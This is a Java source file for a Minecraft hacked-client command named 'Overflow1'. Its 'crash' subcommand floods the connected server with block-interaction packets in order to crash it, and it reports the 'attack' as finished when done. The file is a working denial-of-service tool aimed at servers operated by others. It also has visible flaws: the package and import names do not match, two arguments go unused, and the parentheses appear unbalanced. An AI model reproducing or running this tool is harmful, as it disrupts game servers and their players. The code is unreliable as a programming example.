package net.paradise_client.command.impl;

import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import net.spectaclient.command.Command;
import net.spectaclient.Helper;

public class Overflow1 extends Command {
    public Overflow1() {
        super("Overflow1", "Overflow Warning Spammer [PE/ViaVer Abuser]");
    }

    @Override
    public void build(LiteralArgumentBuilder<?> root) {
        root.then(
            literal("crash")
                .then(argument("packets", IntegerArgumentType.integer())
                    .then(argument("mode", StringArgumentType.word())
                        .then(argument("size", IntegerArgumentType.integer())
                            .executes(context -> {
                                int packets = IntegerArgumentType.getInteger(context, "packets");
                                String mode = StringArgumentType.getString(context, "mode");
                                int size = IntegerArgumentType.getInteger(context, "size");
                                executeCrash(packets, mode, size);
                                return 1;
                            })
                        )
                    )
                )
            )
        );
    }

    private void executeCrash(int packets, String mode, int size) {
        Helper.printChatMessage("Starting crashing with " + packets + " packets");
        
        MinecraftClient mc = MinecraftClient.getInstance();
        if (mc.player == null || mc.player.networkHandler == null) return;
        
        for (int i = 0; i < packets; i++) {
            BlockPos pos = new BlockPos(0, 0, 0);
            Vec3d vec = new Vec3d(0, 0, 0);
            BlockHitResult hitResult = new BlockHitResult(vec, Direction.DOWN, pos, false);
            
            PlayerInteractBlockC2SPacket packet = new PlayerInteractBlockC2SPacket(
                Hand.MAIN_HAND, 
                hitResult, 
                i
            );
            
            mc.player.networkHandler.sendPacket(packet);
        }
        
        Helper.printChatMessage("Attack successfully finished!");
    }
}
